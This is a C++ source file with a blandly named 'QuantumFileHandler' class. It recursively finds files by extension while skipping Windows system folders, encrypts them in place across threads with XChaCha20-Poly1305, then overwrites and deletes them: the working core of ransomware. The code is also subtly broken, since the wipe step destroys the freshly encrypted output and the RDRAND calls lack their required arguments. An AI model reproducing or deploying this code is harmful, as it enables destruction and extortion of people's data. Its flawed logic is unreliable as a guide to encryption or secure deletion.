#include <iostream>
#include <filesystem>
#include <vector>
#include <set>
#include <fstream>
#include <thread>
#include <mutex>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <sodium.h>
#include <immintrin.h>
#include <tmmintrin.h>

namespace fs = std::filesystem;

class QuantumFileHandler {
public:
    QuantumFileHandler(const std::string& key) : encryption_key(key) {
        if (sodium_init() < 0) {
            throw std::runtime_error("Libsodium initialization failed");
        }
    }

    void add_extension(const std::string& ext) {
        target_extensions.insert(ext);
    }

    std::vector<fs::path> find_target_files(const fs::path& root_dir) {
        std::vector<fs::path> target_files;
        std::set<std::string> system_dirs = {
            "Windows", "Program Files", "Program Files (x86)", 
            "ProgramData", "AppData", "System Volume Information"
        };

        for (const auto& entry : fs::recursive_directory_iterator(root_dir)) {
            if (entry.is_regular_file()) {
                // Skip system directories
                bool skip = false;
                for (const auto& part : entry.path()) {
                    if (system_dirs.find(part.string()) != system_dirs.end()) {
                        skip = true;
                        break;
                    }
                }
                if (skip) continue;

                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                if (target_extensions.find(ext) != target_extensions.end()) {
                    target_files.push_back(entry.path());
                }
            }
        }
        return target_files;
    }

    void process_files(const std::vector<fs::path>& files, bool encrypt) {
        std::vector<std::thread> threads;
        std::mutex mutex;
        auto chunk_size = files.size() / std::thread::hardware_concurrency() + 1;

        for (size_t i = 0; i < files.size(); i += chunk_size) {
            auto start = files.begin() + i;
            auto end = i + chunk_size < files.size() ? files.begin() + i + chunk_size : files.end();
            std::vector<fs::path> chunk(start, end);

            threads.emplace_back([&, chunk, encrypt]() {
                for (const auto& file : chunk) {
                    try {
                        if (encrypt) {
                            auto data = read_file(file);
                            auto encrypted = quantum_encrypt(data);
                            write_file(file, encrypted);
                            secure_delete(file, data.size());
                        } else {
                            auto data = read_file(file);
                            auto decrypted = quantum_decrypt(data);
                            write_file(file, decrypted);
                        }
                    } catch (const std::exception& e) {
                        std::lock_guard<std::mutex> lock(mutex);
                        std::cerr << "Error processing " << file << ": " << e.what() << std::endl;
                    }
                }
            });
        }

        for (auto& thread : threads) {
            thread.join();
        }
    }

private:
    std::set<std::string> target_extensions;
    std::string encryption_key;

    std::vector<unsigned char> read_file(const fs::path& file_path) {
        std::ifstream file(file_path, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Cannot open file: " + file_path.string());
        }
        return std::vector<unsigned char>(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>()
        );
    }

    void write_file(const fs::path& file_path, const std::vector<unsigned char>& data) {
        std::ofstream file(file_path, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Cannot write to file: " + file_path.string());
        }
        file.write(reinterpret_cast<const char*>(data.data()), data.size());
    }

    void secure_delete(const fs::path& file_path, size_t original_size) {
        // Overwrite the original file with random data using AVX-512
        std::fstream file(file_path, std::ios::in | std::ios::out | std::ios::binary);
        if (!file) return;

        // Write random data 7 times (Gutmann method)
        const size_t buffer_size = 64; // AVX-512 register size
        __m512i random_buffer;
        for (int pass = 0; pass < 7; pass++) {
            file.seekp(0);
            size_t remaining = original_size;
            while (remaining > 0) {
                // Generate random data using AVX-512
                _mm512_storeu_si512(&random_buffer, _mm512_set_epi64(
                    _rdrand64_step(), _rdrand64_step(),
                    _rdrand64_step(), _rdrand64_step(),
                    _rdrand64_step(), _rdrand64_step(),
                    _rdrand64_step(), _rdrand64_step()
                ));
                size_t chunk = std::min(remaining, buffer_size);
                file.write(reinterpret_cast<const char*>(&random_buffer), chunk);
                remaining -= chunk;
            }
            file.flush();
        }
        file.close();
        fs::remove(file_path);
    }

    std::vector<unsigned char> quantum_encrypt(const std::vector<unsigned char>& plaintext) {
        // Use XChaCha20-Poly1305 for encryption
        unsigned char nonce[crypto_aead_xchacha20poly1305_ietf_NPUBBYTES];
        randombytes_buf(nonce, sizeof(nonce));

        std::vector<unsigned char> ciphertext(plaintext.size() + crypto_aead_xchacha20poly1305_ietf_ABYTES);
        unsigned long long ciphertext_len;

        crypto_aead_xchacha20poly1305_ietf_encrypt(
            ciphertext.data(), &ciphertext_len,
            plaintext.data(), plaintext.size(),
            nullptr, 0,
            nullptr, nonce,
            reinterpret_cast<const unsigned char*>(encryption_key.data())
        );

        ciphertext.resize(ciphertext_len + sizeof(nonce));
        std::copy(nonce, nonce + sizeof(nonce), ciphertext.begin() + ciphertext_len);
        return ciphertext;
    }

    std::vector<unsigned char> quantum_decrypt(const std::vector<unsigned char>& ciphertext) {
        if (ciphertext.size() < crypto_aead_xchacha20poly1305_ietf_NPUBBYTES + crypto_aead_xchacha20poly1305_ietf_ABYTES) {
            throw std::runtime_error("Ciphertext too short");
        }

        size_t nonce_size = crypto_aead_xchacha20poly1305_ietf_NPUBBYTES;
        size_t ciphertext_len = ciphertext.size() - nonce_size;
        const unsigned char* nonce = ciphertext.data() + ciphertext_len;

        std::vector<unsigned char> plaintext(ciphertext_len);
        unsigned long long plaintext_len;

        if (crypto_aead_xchacha20poly1305_ietf_decrypt(
            plaintext.data(), &plaintext_len,
            nullptr,
            ciphertext.data(), ciphertext_len,
            nullptr, 0,
            nonce,
            reinterpret_cast<const unsigned char*>(encryption_key.data())
        ) != 0) {
            throw std::runtime_error("Decryption failed");
        }

        plaintext.resize(plaintext_len);
        return plaintext;
    }
};